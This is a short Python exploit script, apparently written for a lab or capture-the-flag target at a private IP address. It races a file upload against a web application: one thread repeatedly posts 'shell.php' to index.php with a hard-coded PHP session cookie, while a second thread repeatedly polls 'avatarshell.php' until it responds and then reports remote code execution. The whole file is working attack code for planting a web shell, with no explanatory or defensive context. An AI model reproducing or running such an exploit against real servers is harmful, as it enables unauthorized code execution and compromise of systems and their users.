import sys
import threading
import requests

URL = "http://192.168.244.129:12010/"
COOKIE = {"PHPSESSID": "snp79cjmfnbroollc594iqt4ts"}


def uploadShell():
    while True:
        requests.post(URL + "index.php", cookies=COOKIE, files={"file":open("shell.php", "rb")})


def getShell():
    while True:
        resp = requests.get(URL +"avatarshell.php", cookies=COOKIE)
        # print(resp)
        
        if  resp.status_code  != 404:
            print("[+] RCE Successfully")
            sys.exit()
        else:
            print(".", end = '')

        

if __name__ == "__main__":
    t1 = threading.Thread(target=uploadShell)
    t2 = threading.Thread(target=getShell)
    t2.start()
    t1.start()
    